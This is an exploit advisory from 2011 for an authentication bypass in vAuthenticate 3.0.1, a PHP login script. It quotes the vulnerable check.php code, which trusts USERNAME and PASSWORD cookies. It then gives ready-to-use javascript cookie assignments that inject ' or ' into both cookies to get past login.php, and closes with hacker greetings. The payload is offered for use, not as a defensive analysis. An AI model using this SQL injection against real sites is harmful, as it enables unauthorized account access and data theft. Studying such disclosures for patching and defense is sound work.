@@ -1,0 +1,60 @@
+-----------------------------------------------------------------------
+
+vAuthenticate 3.0.1 Auth Bypass by Cookie SQL Injection Vulnerability
+
+-----------------------------------------------------------------------
+
+Author: bd0rk
+
+Contact: bd0rk[at]hackermail.com
+
+Date: 2011 / 08 / 30
+
+MEZ-Time: 01:35
+
+Tested on WinVista & Ubuntu-Linux
+
+Affected-Software: vAuthenticate 3.0.1
+
+Vendor: http://www.beanbug.net/vScripts.php
+
+Download: http://www.beanbug.net/Scripts/vAuthenticate_3.0.1.zip
+
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+Found vulnerable code in check.php:
+
+if (isset($_COOKIE['USERNAME']) && isset($_COOKIE['PASSWORD']))
+    {
+        // Get values from superglobal variables
+        $USERNAME = $_COOKIE['USERNAME'];
+        $PASSWORD = $_COOKIE['PASSWORD'];
+
+        $CheckSecurity = new auth();
+        $check = $CheckSecurity->page_check($USERNAME, $PASSWORD);
+    }
+    else
+    {
+        $check = false;
+    }
+
+	if ($check == false)
+	{
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+Exploit: javascript:document.cookie = "[USERNAME]=' or '; [PATH]";
+
+         javascript:document.cookie = "[PASSWORD]=' or '; [PATH]";
+
+
+Them use login.php 4AuthBypass :P
+
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
+
+---Greetings from hot Germany, the 22 years old bd0rk. :-)
+
+Special-Greetz: Zubair Anjum, Perle, DJTrebo, Anonymous, GolD_M, hoohead
